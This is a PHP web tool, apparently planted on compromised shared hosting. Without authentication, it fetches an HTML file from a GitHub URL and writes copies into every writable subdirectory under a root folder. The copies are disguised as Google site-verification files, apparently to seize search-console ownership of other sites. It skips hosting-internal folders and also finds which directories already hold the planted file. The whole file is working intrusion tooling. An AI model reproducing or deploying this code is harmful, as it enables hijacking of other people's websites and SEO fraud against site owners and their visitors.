<?php
# EdN9Udk0LTteIJD7

error_reporting(0);

// Folder yang akan di-skip total (rekursif)
$folder_blacklist = [
  // WordPress
  'wp-content', 'wp-includes', 'wp-admin',

  // Hosting internal
  '.cagefs', '.cpanel', '.cl.selector', '.caldav', '.htpasswds',
  '.koality', '.razor', '.softaculous', '.spamassassin', '.subaccounts', '.wp-cli',
  '.trash', '.pki', '.cache', '.security', '.config',

  // Log, tmp, system
  'access-logs', 'logs', 'lscache', 'ssl', 'tmp', 'public_ftp',
  'sitepad-editor', 'etc', 'mail',

  // Backup Softaculous
  'softaculous_backups'
];

function unduh_file($url) {
    $min_size = 10;

    $fh = @fopen($url, 'r');
    if ($fh) {
        $data = @stream_get_contents($fh);
        fclose($fh);
        if ($data !== false && strlen($data) >= $min_size) return $data;
    }

    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 6,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_USERAGENT => 'Mozilla/5.0'
        ]);
        $result = curl_exec($ch);
        curl_close($ch);
        if ($result !== false && strlen($result) >= $min_size) return $result;
    }

    $data = @file_get_contents($url);
    if ($data !== false && strlen($data) >= $min_size) return $data;

    ob_start();
    $success = @readfile($url);
    $data = ob_get_clean();
    if ($success !== false && strlen($data) >= $min_size) return $data;

    return '';
}

function deploy_to_subdirs($dir, $fname, $level = 1, $max = 5) {
    global $folder_blacklist;

    if ($level > $max || !is_dir($dir)) return;

    $base = basename($dir);
    if (in_array(strtolower($base), array_map('strtolower', $folder_blacklist))) return;

    $filepath = rtrim($dir, '/') . '/' . $fname;

    static $data = null;
    if ($data === null) {
        $url = 'https://raw.githubusercontent.com/NoobTecho/HtmlGs/main/jaya.html';
        $data = unduh_file($url);
    }

    if (!file_exists($filepath) && $data !== '' && is_writable($dir)) {
        file_put_contents($filepath, $data);
    }

    foreach (glob($dir . '/*', GLOB_ONLYDIR) as $sub) {
        deploy_to_subdirs($sub, $fname, $level + 1, $max);
    }
}

function cari_isi($dir, $fname, $target, $level = 1, $max = 5, &$hasil = []) {
    global $folder_blacklist;

    if ($level > $max || !is_dir($dir)) return;
    $base = basename($dir);
    if (in_array(strtolower($base), array_map('strtolower', $folder_blacklist))) return;

    $filepath = rtrim($dir, '/') . '/' . $fname;
    if (is_file($filepath)) {
        $isi = trim(@file_get_contents($filepath));
        if ($isi === $target) {
            $hasil[] = realpath($dir);
        }
    }

    foreach (glob($dir . '/*', GLOB_ONLYDIR) as $sub) {
        cari_isi($sub, $fname, $target, $level + 1, $max, $hasil);
    }
}

$cwd = getcwd();
// Horenggeh
// $fname = 'googled1cf9715b648d312.html';
// kopsudcantik
// $fname = 'googlefab0bc76ad863593.html';
// jaya
$fname = 'google5d7f7032df0ec119.html';

// === HTML START ===
echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>";

if ($_GET['x'] === 'a') {
    echo "Sebar File HTML";
    echo "</title></head><body>";
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $base = rtrim($_POST['r'], '/');
        deploy_to_subdirs($base, $fname);
        echo "<p style='color:green;'>✅ File <b>$fname</b> berhasil disebar dari <b>$base</b></p>";
    }

    echo '<h3>🗂️ Sebar File HTML</h3>
    <form method="post">
        <label>Root Folder:</label>
        <input type="text" name="r" value="' . htmlspecialchars($cwd) . '" style="width:400px">
        <input type="submit" value="Sebar">
    </form>';
    echo "</body></html>";
    exit;
}

if ($_GET['x'] === 'b') {
    echo "Cari File Berdasarkan Isi";
    echo "</title></head><body>";
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $base = rtrim($_POST['r'], '/');
        $target = trim($_POST['t']);
        $hasil = [];
        cari_isi($base, $fname, $target, 1, 5, $hasil);

        if ($hasil) {
            echo "<h3>✅ Ditemukan di:</h3><ul id='found-list'>";
            foreach ($hasil as $h) echo "<li class='found-item'>" . htmlspecialchars($h) . "</li>";
            echo "</ul>";
        } else {
            echo "<p style='color:red;'>❌ Tidak ditemukan file dengan isi <code>$target</code> di <b>$base</b></p>";
        }
    }

    echo '<h3>🔍 Cari File HTML Berdasarkan Isi</h3>
    <form method="post">
        <label>Root Folder:</label>
        <input type="text" name="r" value="' . htmlspecialchars($cwd) . '" style="width:400px"><br><br>
        <label>Isi target:</label>
        <input type="text" name="t" required style="width:300px;">
        <input type="submit" value="Cari">
    </form>';
    echo "</body></html>";
    exit;
}

echo "Mode Pilihan";
echo "</title></head><body>";
echo "<p>🧭 Mode: <code>?x=a</code> untuk sebar file | <code>?x=b</code> untuk cari berdasarkan isi</p>";
echo "</body></html>";
